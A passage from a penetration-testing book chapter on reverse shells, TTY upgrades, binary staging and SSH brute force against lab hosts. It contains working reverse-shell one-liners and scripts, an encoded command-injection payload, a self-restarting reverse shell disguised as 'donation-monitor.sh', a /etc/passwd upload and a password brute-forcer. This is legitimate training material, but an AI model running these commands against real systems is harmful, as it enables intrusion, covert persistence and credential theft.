<p class="TX">This script sets a few predefined ports in an array: 34455, 34456, 34457, 34458, and 34459 <span class="CodeAnnotation" aria-label="annotation1">❶</span>. At <span class="CodeAnnotation" aria-label="annotation3">❸</span>, an infinite <span class="SANS_TheSansMonoCd_W5Regular_11">while</span> loop continuously attempts to connect to the listener. We then iterate through the ports by using a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop and check whether each port is reachable by using the <span class="SANS_TheSansMonoCd_W5Regular_11">listener_is_reachable()</span> function <span class="CodeAnnotation" aria-label="annotation4">❹</span>, which uses the special <i>/dev/tcp</i> device. Notice that we prepend the reachability check <span class="CodeAnnotation" aria-label="annotation2">❷</span> with the <span class="SANS_TheSansMonoCd_W5Regular_11">timeout</span> command to ensure that the command exits at a set interval of 0.5 seconds. If the port is reachable, we call the <span class="SANS_TheSansMonoCd_W5Regular_11">connect_reverse_shell()</span> function, passing the open port as an argument, and send an interactive shell to it using <i>/dev/tcp</i>.</p>&#13;
<p class="TX">As we’re performing multiple network connections consecutively (one for the connectivity check and another to establish the reverse shell), some versions of Netcat may not support keeping the listener alive. To overcome this, we can use socat to set up a TCP listener on the Kali box. This tool will ensure that the listener remains alive:</p>&#13;
<pre><code>$ <b>socat - tcp-listen:34459,fork</b></code></pre>&#13;
<p class="TX">If you run the script on one of the compromised hosts, such as <i>p-web-01</i> (172.16.10.10), it should yield the following output:</p>&#13;
<pre><code>$ <b>./port-hopper.sh</b>&#13;
&#13;
<var>--snip--</var>&#13;
Port 34457 is not reachable.&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_154" aria-label="154"/>Port 34458 is not reachable.&#13;
Port 34459 is reachable, attempting a connection...&#13;
</code></pre>&#13;
<p class="TX">In the next section, we’ll discuss a few methods we can use to stage new binaries into a target environment without the superuser privileges necessary to download official packages from public repositories.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h2 class="H1" id="sec14"><span id="h1-51"/><span class="SANS_Futura_Std_Bold_B_11">Spawning TTY Shells with Pseudo-terminal Devices</span></h2>&#13;
<p class="TNI1">Here’s another scenario you might encounter in future shell-popping adventures: the limited shell you have access to might not provide full TTY (terminal) support. Non-TTY shells have limited command line editing, no job control, incomplete output formatting, and missing signal handling, and they may not work in interactive applications such as text editors.</p>&#13;
<p class="TX">One common approach to upgrading a shell to a feature-rich TTY one is by using pseudo-terminals. A <i>pseudo-terminal</i> provides an interface through which processes can interact with a terminal-like device, allowing terminal-based applications, shells, and other programs to operate as if they were connected to a physical terminal.</p>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
<h3 class="H2" id="sec15"><span id="h2-104"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Python’s pty Module</span></h3>&#13;
<p class="TNI1">The Python <span class="SANS_TheSansMonoCd_W5Regular_11">pty</span> module emulates the functionality of a physical terminal device. In the following example, we upgrade a Python shell to a fully interactive TTY bash shell by using the <span class="SANS_TheSansMonoCd_W5Regular_11">pty.spawn()</span> function. Try running this on the Kali host to see what it does:</p>&#13;
<pre><code>$ <b>python</b>&#13;
&#13;
Python 3.xx (main, Feb 12, 00:48:52) on linux&#13;
Type "help", "copyright", "credits" or "license" for more information.&#13;
&#13;
&gt;&gt;&gt; <b>import pty</b>&#13;
&gt;&gt;&gt; <b>pty.spawn("/bin/bash")</b>&#13;
&#13;
$&#13;
</code></pre>&#13;
<p class="TX">To exit the Python console, enter <span class="SANS_TheSansMonoCd_W7Bold_B_11">exit()</span>.</p>&#13;
<p class="TX">On a compromised host with Python installed, you could elevate your shell by executing the following command:</p>&#13;
<pre><code>$ <b>python3 -c 'import pty; pty.spawn("/bin/bash")'</b></code></pre>&#13;
<p class="TX">Keep in mind that Python must be available on the compromised host for this technique to work.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h3 class="H2" id="sec16"><span id="h2-105"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_155" aria-label="155"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">socat</span></h3>&#13;
<p class="TNI1">You can use socat to spawn a TTY shell if the tool exists on the target and in your local hacking system. We generally use socat for bidirectional communications between two data channels.</p>&#13;
<p class="TX">On Kali, run the <span class="SANS_TheSansMonoCd_W5Regular_11">socat</span> command to spawn a TTY shell:</p>&#13;
<pre><code>$ <b>socat file:$(tty),raw,echo=0 tcp-listen:1337</b></code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">file:</span> parameter uses the value of the <span class="SANS_TheSansMonoCd_W5Regular_11">$(tty)</span> command, which expands to <span class="SANS_TheSansMonoCd_W5Regular_11">/dev/pts/#</span>. Raw mode (<span class="SANS_TheSansMonoCd_W5Regular_11">raw</span>) ensures that socat won’t process input and output data, <span class="SANS_TheSansMonoCd_W5Regular_11">echo=0</span> disables socat’s local echoing, and <span class="SANS_TheSansMonoCd_W5Regular_11">tcp-listen:1337</span> defines the local TCP listening port.</p>&#13;
<p class="TX">Next, by using the OS command injection vulnerability on <i>p-web-02</i> (172.16.10.12), execute the following command. Note the use of the pipe character to trigger the injection vulnerability:</p>&#13;
<pre><code>|<b> socat exec:'bash -li',pty,stderr tcp:172.16.10.1:1337</b></code></pre>&#13;
<p class="TX">In this example, we call <span class="SANS_TheSansMonoCd_W5Regular_11">socat</span> with the <span class="SANS_TheSansMonoCd_W5Regular_11">exec</span> parameter <span class="SANS_TheSansMonoCd_W5Regular_11">'bash -li'</span>, which will execute bash interactively as if it had been invoked as a login shell. We also pass <span class="SANS_TheSansMonoCd_W5Regular_11">pty,stderr</span> to generate a pseudo-terminal and capture the standard error stream, followed by <span class="SANS_TheSansMonoCd_W5Regular_11">tcp:172.16.10.1:1337</span> to set the connection address using TCP.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h2 class="H1" id="sec17"><span id="h1-52"/><span class="SANS_Futura_Std_Bold_B_11">Post-exploitation Binary Staging</span></h2>&#13;
<p class="TNI1">Let’s discuss a few ways to upgrade from a limited shell environment without needing root-level access. In this section, we’ll assume we weren’t able to use bash alone to establish a reverse shell connection to <i>p-web-02</i> through the <i>/dev/tcp</i> special pseudo-device file.</p>&#13;
<p class="TX">Even if the <i>www-data</i> user lacks permissions and the ability to install software on the server, we can use bash alone to execute many attacks. However, missing certain core binaries, especially those used for networking, can make our hacker lives especially tough.</p>&#13;
<p class="TX">As we noted in <a href="chapter7.xhtml#tab7-1">Table 7-1</a>, <i>p-web-02</i> doesn’t have the <span class="SANS_TheSansMonoCd_W5Regular_11">wget</span> binary available for downloading files from remote servers. Let’s try to execute a few other common network utility commands to see whether they exist:</p>&#13;
<pre><code>www-data@p-web-02:/var/www/html$ <b>ssh</b>&#13;
bash: ssh: command not found&#13;
www-data@p-web-02:/var/www/html$ <b>nc</b>&#13;
bash: ssh: command not found&#13;
www-data@p-web-02:/var/www/html$ <b>socat</b>&#13;
bash: socat: command not found&#13;
www-data@p-web-02:/var/www/html$ <b>python --version</b>&#13;
bash: python: command not found&#13;
www-data@p-web-02:/var/www/html$ <b>curl</b>&#13;
curl: try 'curl --help' or 'curl --manual' for more information&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_156" aria-label="156"/>Wow, this host really has no way to establish an outbound connection. We do have <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, but it isn’t possible to use <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to make direct reverse shell connections.</p>&#13;
<p class="TX">In cases such as these, downloading a Netcat binary to the target server would come in handy. By taking advantage of application vulnerabilities such as code execution, we could potentially install such a networking utility, then use it to establish an upgraded reverse shell connection.</p>&#13;
<p class="TX">In this section, we cover helpful commands we could use to pull network binaries into our target environments and execute them. Note that we’ll use our reverse shell connection with <i>p-web-02</i> to cheat a little here, but the following techniques could very well be executed using the OS command injection vulnerability we uncovered. We’ll demonstrate its use in a few examples.</p>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
<h3 class="H2" id="sec18"><span id="h2-106"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Serving Netcat</span></h3>&#13;
<p class="TNI1">In your Kali machine, navigate to the directory of the payload you want to transfer, then enter the following Python command to stand up an HTTP server:</p>&#13;
<pre><code>$ <b>cd Black-Hat-Bash/ch07</b>&#13;
$ <b>python -m http.server</b>&#13;
</code></pre>&#13;
<p class="TX">On <i>p-web-02</i> (172.16.10.12), you should now be able to access the filesystem of your Kali machine through the Python HTTP server and execute a download command by using <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>. Place a copy of the Kali <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span> binary into the same directory as the HTTP server:</p>&#13;
<pre><code>$ <b>which nc</b>&#13;
/usr/bin/nc&#13;
&#13;
$ <b>cp /usr/bin/nc ~/Black-Hat-Bash/ch07</b>&#13;
</code></pre>&#13;
<p class="TX">You can now download it to <i>p-web-02</i> by using a remote <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> command and set it as an executable:</p>&#13;
<pre><code>$ <b>cd /var/www/html</b>&#13;
$ <b>curl -O http://172.16.10.1:8000/nc</b>&#13;
&#13;
% Total    % Received % Xferd  Average  Speed    Time    Time    Time  Current&#13;
                                 Dload  Upload   Total   Spent   Left  Speed&#13;
100 34952  100 34952    0     0  33.3M      0 --:--:-- --:--:--  --:-- 33.3M&#13;
</code></pre>&#13;
<p class="TX">Within the Kali machine, we can now establish a secondary reverse shell connection in a new terminal on a different port. Let’s choose 1234 (as our first reverse shell uses port 1337):</p>&#13;
<pre><code>$ <b>nc -lvp 1234</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_157" aria-label="157"/>Next, we can execute the new <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span> binary from within the first reverse shell to establish a second one via <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span>. We can also send this process to the background by using <span class="SANS_TheSansMonoCd_W5Regular_11">&amp;</span>:</p>&#13;
<pre><code># <b>chmod u+x nc</b>&#13;
# <b>./nc 172.16.10.1 1234 -e /bin/bash &amp;</b>&#13;
&#13;
[1] 140&#13;
</code></pre>&#13;
<p class="TX">Alternatively, we simply call the Netcat binary in <i>p-web-02</i> from within a new Kali terminal by using <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to exploit the OS command injection vulnerability:</p>&#13;
<pre><code>$ <b>curl http://172.16.10.12/donate.php?amount=%7C+.%2Fnc+172.16.10.1+1234+-e+%2Fbin%2Fbash</b></code></pre>&#13;
<p class="TX">This approach bypasses the need for the first reverse shell.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
<h3 class="H2" id="sec19"><span id="h2-107"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Uploading Files with pwncat</span></h3>&#13;
<p class="TNI1">When we use pwncat to establish a shell, we can leverage its <span class="SANS_TheSansMonoCd_W5Regular_11">upload</span> command to transfer files between the attacker and compromised target machines. The <span class="SANS_TheSansMonoCd_W5Regular_11">upload</span> command accepts two arguments, the source file and its destination:</p>&#13;
<pre><code>(local) pwncat$ <b>upload /etc/passwd /tmp/remote_passwd.txt</b>&#13;
[16:16:46] uploaded in 0.32 seconds&#13;
</code></pre>&#13;
<p class="TX">It’s important to remember that, unless pwncat is using SSL, the traffic between the attacker’s machine and the target will be in cleartext. (The same is true for Netcat and Ncat.)</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
<h3 class="H2" id="sec20"><span id="h2-108"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Downloading Binaries from Trusted Sites</span></h3>&#13;
<p class="TNI1">Often, environments won’t block egress traffic made to commonly used websites such as GitHub, GitLab, Google Drive, and Microsoft OneDrive, as well as to cloud services like Amazon Simple Storage Service (S3) and Google Cloud Storage (GCS). Thus, these are great places to host malicious files.</p>&#13;
<p class="TX">Organizations with less security maturity frequently use the same outbound filtering policies for their entire network (including users and servers alike), and there is often no great way to block one part of a website while allowing others. In addition, if a company uses Amazon Web Services (AWS) or any other cloud provider to host its infrastructure, there is a good chance it allows all traffic to and from the cloud provider.</p>&#13;
<p class="TX">As a penetration tester, you should explore any third-party services used by your target and look for ways to host your malicious files from them. For instance, if your target has a public marketing website and offers a chatbot feature for speaking with an agent, there might be a way to anonymously attach files through the chat. If this is the case, you could copy and paste that link and use it to pull malicious files onto compromised hosts down the road.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_158" aria-label="158"/>One benefit to the trusted-site hosting approach is that if a website is served over HyperText Transfer Protocol Secure (HTTPS), communications between the compromised machine and the trusted site will be encrypted automatically.</p>&#13;
<p class="HeadAExercise"><span id="exe-10"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 10: Maintaining a Continuous Reverse Shell Connection</span></p>&#13;
<p class="TNI1">You might want to strengthen your initial foothold on your target by executing a script that continuously reestablishes a reverse shell connection. If the reverse shell process is ever interrupted or disconnected, your script could reestablish a connection with the Kali machine by using the IP address and port you provide.</p>&#13;
<p class="TX"><a href="chapter7.xhtml#Lis7-4">Listing 7-4</a> will run locally as a background process on the compromised server and attempt to reestablish the reverse shell connection at a certain interval we set.</p>&#13;
<span id="Lis7-4"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">reverse_shell _monitor.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
TARGET_HOST="172.16.10.1"&#13;
TARGET_PORT="1337"&#13;
&#13;
# Function to restart the reverse shell process&#13;
restart_reverse_shell() {&#13;
  echo "Restarting reverse shell..."&#13;
  bash -i &gt;&amp; "/dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 0&gt;&amp;1 &amp;&#13;
}&#13;
&#13;
# Continuously monitor the state of the reverse shell.&#13;
while true; do&#13;
  restart_reverse_shell&#13;
  # Sleep for a desired interval before checking again.&#13;
  sleep 10&#13;
done&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 7-4: Monitoring and reestablishing a reverse shell</span></p>&#13;
<p class="TX">The script itself is simple: we call the <span class="SANS_TheSansMonoCd_W5Regular_11">restart_reverse_shell()</span> function every 10 seconds. Regardless of the status of the network or reverse shell process, this function will attempt to reestablish a connection with our Kali host. The Kali machine will refuse any additional connections if a current reverse shell connection is ongoing.</p>&#13;
<p class="TX">Name the script something generic, like <i>donation-monitor.sh</i>, to avoid suspicion, as the script should run in the background indefinitely. Next, save the script to a file on <i>p-web-02</i> (172.16.10.12) and set the appropriate execution permission, then run the script as a background job, redirecting its output:</p>&#13;
<pre><code>$<b> cp reverse_shell_monitor.sh donation-monitor.sh</b>&#13;
$ <b>chmod +x ./donation-monitor.sh</b>&#13;
$ <b>nohup</b> <b>./donation-monitor.sh &gt; /dev/null 2&gt;&amp;1 &amp;</b>&#13;
$<b> rm nohup.out</b>&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_159" aria-label="159"/>To test the script, all you need to do is run the Netcat listener command to serve the reverse shell. Attempt to stop and start the listener multiple times, and notice that the reverse shell is reestablished every 10 seconds.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec21">&#13;
<h2 class="H1" id="sec21"><span id="h1-53"/><span class="SANS_Futura_Std_Bold_B_11">Initial Access with Brute Force</span></h2>&#13;
<p class="TNI1">A more traditional way of entering a remote system is by using the same services an IT administrator would use. By leveraging stolen credentials or exploiting weaknesses such as misconfigurations or poor passwords, we can brute-force a path through a system’s front door.</p>&#13;
<p class="TX">One common service to target is SSH. While generally considered a secure protocol, SSH implementations may have security weaknesses that attackers could exploit, such as poor or reused passwords, insecure authentication methods, and key management issues.</p>&#13;
<p class="TX">We can use bash scripting to perform complex brute-force attacks across numerous service protocols, including SSH. While we could run individual brute-forcing tools in isolation, combining them in a bash script provides numerous benefits. Our scripts can automate host detection, generate wordlists, and integrate with tools to stuff credentials.</p>&#13;
<p class="TX">Let’s try to break into a new target, the <i>p-jumbox-01</i> server (172.16.10.13). To execute an SSH connection, open a new terminal from within the Kali machine and enter the following command:</p>&#13;
<pre><code>$ <b>ssh user@172.16.10.13</b>&#13;
The authenticity of host '172.16.10.13 (172.16.10.13)' can't be established.&#13;
ED25519 key fingerprint is SHA256:c89YzVU+EW/2o+lZm30BgEjutZ0f2t145cSyX2/zwzU.&#13;
This key is not known by any other names.&#13;
Are you sure you want to continue connecting (yes/no/[fingerprint])? <b>yes</b>&#13;
user@172.16.10.13's password:&#13;
</code></pre>&#13;
<p class="TX">The warning message you see after attempting to SSH into <i>p-jumpbox-01</i> indicates that the SSH client does not have the host’s public key stored in its <i>known_hosts</i> file. This file is used to verify the authenticity of the host you are connecting to, and the <i>ED25519 key fingerprint</i> represents the server’s public key. By entering <span class="SANS_TheSansMonoCd_W5Regular_11">yes</span>, we proceed with the SSH connection and place the host’s public key into our <i>known_hosts</i> file.</p>&#13;
<p class="TX">SSH allows both password-based and key-based authentication. In <i>password-based authentication</i>, a user provides their username and password to authenticate themselves to the remote server. In <i>key-based authentication</i> (also known as <i>public-key authentication</i>), a user supplies a cryptographic key to authenticate to a server. Before attempting to brute-force an SSH server, it’s important to verify that the server accepts password-based authentication.</p>&#13;
<p class="TX">To test whether a server allows password-based authentication, simply observe the server’s response after attempting an initial connection. For example, you can see that our initial connection attempt yielded a prompt for the user’s password. Alternatively, you can use Nmap’s built-in NSE script <i>ssh-auth-methods.nse</i> located at <i>/usr/share/nmap/scripts</i>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_160" aria-label="160"/>If the server immediately rejects the connection or provides a generic error message without prompting you for a password, password-based authentication may not be allowed or isn’t the server’s primary authentication method.</p>&#13;
<p class="HeadAExercise"><span id="exe-11"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 11: Brute-Forcing an SSH Server</span></p>&#13;
<p class="TNI1">In this exercise, you’ll use bash to conduct a dictionary-based brute-force attack against the SSH service running on the <i>p-jumpbox-01</i> (172.16.10.13) server. Your script should iterate through a list of common usernames and passwords, attempt to authenticate to the server, and log any successful credentials.</p>&#13;
<p class="TX">Before writing the SSH brute-forcing script, you’ll need two things. First, you must either identify a single target username or generate a list of usernames to iterate through. You didn’t identify any usernames during reconnaissance, so try a list of common Linux usernames, such as <i>root</i>, <i>guest</i>, <i>backup</i>, <i>ubuntu</i>, and <i>centos</i>. Of course, you’re merely guessing that these users exist on the target server.</p>&#13;
<p class="TX">Second, you’ll need a list of potential passwords. Kali contains a great password list in the <i>/usr/share/wordlist</i> directory, but we suggest instead using the <i>common-credentials/passwords.txt</i> password file from the book’s GitHub repository.</p>&#13;
<p class="TX">Armed with your username and password lists, you can write some bash to test the strength of the <i>p-jumpbox-01</i> server’s authentication. <a href="chapter7.xhtml#Lis7-5">Listing 7-5</a> provides an example.</p>&#13;
<span id="Lis7-5"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">ssh-bruteforce.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
&#13;
# Define the target SSH server and port.&#13;
TARGET="172.16.10.13"&#13;
PORT="22"&#13;
&#13;
# Define the username and password lists.&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> USERNAMES=("root" "guest" "backup" "ubuntu" "centos")&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> PASSWORD_FILE="passwords.txt"&#13;
&#13;
echo "Starting SSH credential testing..."&#13;
&#13;
# Loop through each combination of usernames and passwords.&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> for user in "${USERNAMES[@]}"; do&#13;
<span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> while IFS= read -r pass; do&#13;
    echo "Testing credentials: ${user} / ${pass}"&#13;
&#13;
    # Check the exit code to determine if the login was successful.&#13;
    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \&#13;
             <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> -p "${PORT}" "${user}@${TARGET}" exit &gt;/dev/null 2&gt;&amp;1; then&#13;
    <span class="Code_CodeAnnotation" aria-label="annotation6">❻</span> echo "Successful login with credentials:"&#13;
      echo "Host: ${TARGET}"&#13;
      echo "Username: ${user}"&#13;
      echo "Password: ${pass}"&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_161" aria-label="161"/>      # Perform additional actions here using the credentials&#13;
      exit 0&#13;
    fi&#13;
  done &lt; "${PASSWORD_FILE}"&#13;
done&#13;
echo "No valid credentials found."&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 7-5: Brute-forcing SSH</span></p>&#13;
<p class="TX">This SSH brute-force bash script starts much like our other scripts: by defining the target IP address and port. Next, we specify a list of usernames <span class="CodeAnnotation" aria-label="annotation1">❶</span> and a file that contains passwords that we’ll use <span class="CodeAnnotation" aria-label="annotation2">❷</span>. At <span class="CodeAnnotation" aria-label="annotation3">❸</span>, we then iterate through each username and use <span class="SANS_TheSansMonoCd_W5Regular_11">sshpass</span> to inject passwords <span class="CodeAnnotation" aria-label="annotation5">❺</span>, which we read in line by line <span class="CodeAnnotation" aria-label="annotation4">❹</span>. We print any successful output <span class="CodeAnnotation" aria-label="annotation6">❻</span>.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>For the following script to work, we need to install sshpass, a special utility that allows managing SSH connections in scripts. Install sshpass using the following command:</i></p>&#13;
<pre><code>$<b> sudo apt install sshpass -y</b></code></pre>&#13;
<p class="TX">Download and run the script to see the output:</p>&#13;
<pre><code>$ <b>./ssh-bruteforce.sh</b>&#13;
Starting SSH credential testing...&#13;
Testing credentials: root / 123456&#13;
Testing credentials: root / 123456789&#13;
Testing credentials: root / qwerty&#13;
Testing credentials: root / password&#13;
Testing credentials: root / backup&#13;
Testing credentials: root / pass123&#13;
Testing credentials: guest / 123456&#13;
Testing credentials: guest / 123456789&#13;
Testing credentials: guest / qwerty&#13;
Testing credentials: guest / password&#13;
Testing credentials: guest / backup&#13;
Testing credentials: guest / pass123&#13;
Testing credentials: backup / 123456&#13;
Testing credentials: backup / 123456789&#13;
Testing credentials: backup / qwerty&#13;
Testing credentials: backup / password&#13;
Testing credentials: backup / backup&#13;
Successful login with credentials:&#13;
Host: 172.16.10.13&#13;
Username: backup&#13;
Password: backup&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_162" aria-label="162"/>We’ve identified that the username <i>backup</i> uses a weak password (also <i>backup</i>) on the <i>p-jumpbox-01</i> server. We can validate that these credentials work by using this command to log in to the <i>p-jumpbox-01</i> server:</p>&#13;
<pre><code>$ <b>ssh backup@172.16.10.13</b></code></pre>&#13;
<p class="TX">When prompted for credentials, use the password <i>backup</i>, and you should be granted access.</p>&#13;
<p class="TX">To take this script further, attempt the following modifications:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Make the brute-forcing process more efficient by using a dictionary to attack multiple hosts in parallel so that you’re not limited to targeting a single IP address at a time.</li>&#13;
<li class="ListBullet">Add a notification component to the script so that once a host is compromised, you’ll get a notification via your favorite messaging media.</li>&#13;
</ul>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec22">&#13;
<h2 class="H1" id="sec22"><span id="h1-54"/><span class="SANS_Futura_Std_Bold_B_11">Summary</span></h2>&#13;
<p class="TNI1">In this chapter, you learned how to create a reverse shell on a target and uncovered strategies for enhancing the interactivity and longevity of your remote shell interfaces, laying the groundwork for future exploits. You also learned how to transfer files between the attacking and compromised machines. Then you used bash to perform an SSH brute-force attack.</p>&#13;
<p class="TX">Now that you’ve compromised three machines, we highly recommend you start roaming around the compromised hosts to set the stage for what’s coming in the next chapter.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>